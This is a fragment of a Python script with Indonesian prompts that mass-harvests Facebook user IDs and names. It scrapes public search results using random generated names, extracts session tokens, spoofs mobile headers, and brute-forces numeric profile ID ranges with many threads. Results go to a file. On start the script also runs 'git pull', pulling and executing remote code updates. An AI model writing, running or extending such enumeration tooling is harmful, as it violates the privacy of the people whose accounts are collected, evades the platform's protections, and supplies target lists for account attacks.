        self.hdp = {'Accept':'*/*','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9','Content-Type':'application/x-www-form-urlencoded','Dpr':'1.25','Origin':'https://m.facebook.com','Sec-Ch-Prefers-Color-Scheme':'dark','Sec-Ch-Ua':"",'Sec-Ch-Ua-Full-Version-List':"",'Sec-Ch-Ua-Mobile':'?1','Sec-Ch-Ua-Model':"",'Sec-Ch-Ua-Platform':"",'Sec-Ch-Ua-Platform-Version':"",'Sec-Fetch-Dest':'empty','Sec-Fetch-Mode':'cors','Sec-Fetch-Site':'same-origin','User-Agent':self.ua,'X-Requested-With':'XMLHttpRequest','X-Response-Format':'JSONStream'}
        self.lim = int(input('Berapa ID : '))
        self.GetName()
    
    #--> Get Name From Ninjaname.net
    def GetName(self):
        self.daftar_nama = []
        url = 'http://ninjaname.net/indonesian_name.php' #--> You Can Change With Other Country (Check At http://ninjaname.net)
        try:
            pos = bs(self.xyz.post(url,data={'number_generate':'50','gender_type':random.choice(['male','female']),'submit':'Generate'}).content,'html.parser')
            xd = re.findall('• (.*?)<br',str(pos))
            for nm in xd:
                self.GenerateRandomName(nm)
                self.daftar_nama.append(nm)
            with ThreadPoolExecutor(max_workers=30) as ABC:
                for nama in self.daftar_nama: ABC.submit(self.Scrap,nama.lower().replace(' ','+'))
        except Exception as e:
            print('\nSomething Went Wrong, Error At Ninjaname.net')
            exit()

    #--> Generate Random Name
    def GenerateRandomName(self,df):
        for tg in df.split(' '):
            if tg in self.daftar_nama: pass
            else: self.daftar_nama.append(tg)
    
    def Scrap(self,nama):
        self.url = f'https://m.facebook.com/public/{nama}'
        try:
            req = bs(self.xyz.get(self.url,headers=self.hdg,allow_redirects=True).content,'html.parser')
            self.data_post = {'fb_dtsg':re.search('{"dtsg":{"token":"(.*?)",',str(req)).group(1),'lsd':re.search('"LSD",\[\],{"token":"(.*?)"}',str(req)).group(1),'__user':re.search('"USER_ID":"(.*?)"',str(req)).group(1)}
            kid = list(set([str(url).split('=')[1] for url in re.findall('payload:{link:null,url:"(.*?)",',str(req))]))
            with ThreadPoolExecutor(max_workers=30) as TPE:
                for id in kid:
                    if self.dump >= self.lim: break
                    else: TPE.submit(self.GenerateID,id)
            try:
                if self.dump >= self.lim: pass
                else:
                    x,y,z = list(re.findall('cursor=(.*?)&pn=(.*?)&usid=(.*?)&tsid',str(req))[0])
                    next = {'cursor':x,'pn':y,'usid':z,'tsid':''}
                    self.Scroll(next)
            except Exception as e: pass
        except Exception as e: pass
    
    def Scroll(self,next):
        dat = self.data_post.copy()
        dat.update(next)
        try:
            pos = bs(self.xyz.post(self.url,data=dat,headers=self.hdp,allow_redirects=True).content,'html.parser')
            kid = list(set([str(url).split('=')[1] for url in re.findall('payload:{link:null,url:"(.*?)",',str(pos))]))
            with ThreadPoolExecutor(max_workers=30) as TPE:
                for id in kid:
                    if self.dump >= self.lim: break
                    else: TPE.submit(self.GenerateID,id)
            try:
                if self.dump >= self.lim: pass
                else:
                    x,y,z = list(re.findall('cursor=(.*?)&pn=(.*?)&usid=(.*?)&tsid',str(pos))[0])
                    next = {'cursor':x,'pn':y,'usid':z,'tsid':''}
                    self.Scroll(next)
            except Exception as e: pass
        except Exception as e: pass
        
    def GenerateID(self,id):
        try:
            r = requests.Session()
            req = bs(r.get(f'https://m.facebook.com/p/{id}',headers=self.hdg,allow_redirects=True).content,'html.parser')
            nama = req.find('title').text.split(' | ')[0]
            if nama=='Content not found' or nama=='Log in to Facebook': pass
            else:
                ray = {'id':id,'name':nama}
                if ray in self.result: pass
                else:
                    self.result.append(ray)
                    print('%s|%s'%(ray['id'],ray['name']))
                    open('result.txt','a+').write('%s|%s\n'%(ray['id'],ray['name']))
                    self.dump += 1
        except Exception as e: pass

class RandomID():
    def __init__(self):
        print('Contoh Digit     : 10 atau 15')
        dig = int(input('Berapa Digit     : '))
        print('Contoh ID Awal   : 175004 atau 10009108507')
        dep = input('Masukkan ID Awal : ')
        print('')
        if len(str(dep)) >= dig:
            print('Digit Awal Tidak Boleh Melebihi Jumlah Digit!')
            exit()
        sis = dig - len(dep)
        awal = 10**(sis-1)
        akhir = 10**(sis)
        with ThreadPoolExecutor(max_workers=35) as TPE:
            for ls in range(awal,akhir):
                TPE.submit(self.Scrap,dep,ls)
    def UserAgent(self):
        ua = 'Mozilla/5.0 (Linux; Android 11; vivo 1918 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.0000.00 Mobile Safari/537.36'
        return(ua)
    def Scrap(self,aw,ls):
        try:
            r = requests.Session()
            head = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9','Dpr':'1.125','Sec-Ch-Prefers-Color-Scheme':'dark','Sec-Ch-Ua':'','Sec-Ch-Ua-Full-Version-List':'','Sec-Ch-Ua-Mobile':'?1','Sec-Ch-Ua-Model':'','Sec-Ch-Ua-Platform':'','Sec-Ch-Ua-Platform-Version':'','Sec-Fetch-Dest':'document','Sec-Fetch-Mode':'navigate','Sec-Fetch-Site':'none','Sec-Fetch-User':'?1','Upgrade-Insecure-Requests':'1','User-Agent':self.UserAgent(),'Viewport-Width':'320'}
            id = '%s%s'%(aw,str(ls))
            url = 'https://m.facebook.com/profile.php?id=%s'%(id)
            req = r.get(url,headers=head)
            if 'next=' in str(req.url): pass
            else:
                nama = bs(req.content,'html.parser').find('title').text.split(' | ')[0]
                if nama=='Content not found' or nama=='Error Facebook' or re.search(r'\d',nama): pass
                else:
                    print('%s|%s'%(id,nama))
                    open('result.txt','a+').write('%s|%s\n'%(id,nama))
        except Exception as e: pass

if __name__=='__main__':
    os.system('git pull')
    pilihan()